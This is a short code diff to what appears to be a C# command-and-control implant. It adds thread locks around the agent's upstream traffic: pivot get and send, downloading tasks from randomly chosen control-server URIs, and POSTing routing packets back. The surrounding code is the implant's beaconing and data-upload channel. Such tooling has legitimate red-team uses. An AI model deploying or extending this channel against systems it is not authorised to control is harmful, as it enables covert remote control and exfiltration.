@@ -281,7 +281,10 @@ AESc = AES encrypted using the client's session key
 
             byte[] pivotResult = null;
             bool pivotUsed = false;
-            TryPivotGet(ref pivotResult, ref pivotUsed);
+            lock (_upstreamLock)
+            {
+                TryPivotGet(ref pivotResult, ref pivotUsed);
+            }
             if (pivotUsed) return pivotResult;
 
             byte[] results = new byte[0];
@@ -297,7 +300,10 @@ AESc = AES encrypted using the client's session key
 
                 Random random = new Random();
                 string selectedTaskURI = sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)];
-                results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
+                lock (_upstreamLock)
+                {
+                    results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
+                }
             }
             catch (WebException)
             {
@@ -329,7 +335,10 @@ AESc = AES encrypted using the client's session key
             if (malleableUsed) return;
 
             bool pivotSendUsed = false;
-            TryPivotSend(routingPacket, ref pivotSendUsed);
+            lock (_upstreamLock)
+            {
+                TryPivotSend(routingPacket, ref pivotSendUsed);
+            }
             if (pivotSendUsed) return;
 
             Random random = new Random();
@@ -345,7 +354,10 @@ AESc = AES encrypted using the client's session key
                 try
                 {
                     string taskUri = sessionInfo.GetTaskUrIs()[random.Next(sessionInfo.GetTaskUrIs().Length)];
-                    webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
+                    lock (_upstreamLock)
+                    {
+                        webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
+                    }
                 }
                 catch (WebException) { }
             }
